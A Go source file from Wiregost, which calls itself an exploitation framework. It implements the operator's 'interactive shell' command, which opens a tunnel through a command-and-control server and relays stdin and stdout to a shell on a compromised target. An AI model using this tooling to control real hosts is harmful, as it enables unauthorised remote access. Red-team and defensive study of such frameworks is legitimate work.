// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package shell

import (
	"fmt"
	"io"
	"os"

	"github.com/gogo/protobuf/proto"
	"golang.org/x/crypto/ssh/terminal"

	. "github.com/maxlandon/wiregost/client/commands"
	"github.com/maxlandon/wiregost/client/constants"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
)

type ShellOptions struct {
	ShellPath string `long:"shell-path" description:"Path to shell executable"`
	Pty       bool   `long:"no-pty" description:"Enable pty terminal (Linux/Darwin only)"`
}

type InteractiveShellCmd struct {
	*ShellOptions `group:"Shell options"`
}

var InteractiveShell InteractiveShellCmd

func RegisterInteractiveShell() {
	GhostParser.AddCommand(constants.InteractiveShell, "", "", &InteractiveShell)

	sh := GhostParser.Find(constants.InteractiveShell)
	sh.ShortDescription = "Get an interactive shell on the remote target"
}

func (sh *InteractiveShellCmd) Execute(args []string) error {

	fmt.Printf(Info + "Opening shell tunnel (EOF to exit) ...\n\n")

	tunnel, err := Context.Server.CreateTunnel(Context.Ghost.ID, DefaultTimeout)
	if err != nil {
		fmt.Printf(Warn+"%s", err)
		return nil
	}

	shellReqData, _ := proto.Marshal(&ghostpb.ShellReq{
		GhostID:   Context.Ghost.ID,
		EnablePTY: !sh.Pty,
		TunnelID:  tunnel.ID,
		Path:      sh.ShellPath,
	})
	resp := <-Context.Server.RPC(&ghostpb.Envelope{
		Type: ghostpb.MsgShellReq,
		Data: shellReqData,
	}, DefaultTimeout)
	if resp.Err != "" {
		fmt.Printf(Warn+"Error: %s", resp.Err)
		return nil
	}

	var oldState *terminal.State
	if sh.Pty { // Change this to use no putty by default
		// if !sh.Pty {
		oldState, err = terminal.MakeRaw(0)
		fmt.Printf("Saving terminal state: %v", oldState)
		if err != nil {
			fmt.Printf(Warn + "Failed to save terminal state")
			return nil
		}
	}

	go func() {
		_, err := io.Copy(os.Stdout, tunnel)
		if err != nil {
			fmt.Printf(Warn+"error write stdout: %v", err)
			return
		}
	}()
	for {
		_, err := io.Copy(tunnel, os.Stdin)
		if err == io.EOF {
			break
		}
		if err != nil {
			fmt.Printf(Warn+"error read stdin: %v", err)
			break
		}
	}
	if sh.Pty { // Change this to use no putty by default
		// if !sh.Pty {
		terminal.Restore(0, oldState)
	}

	return nil
}
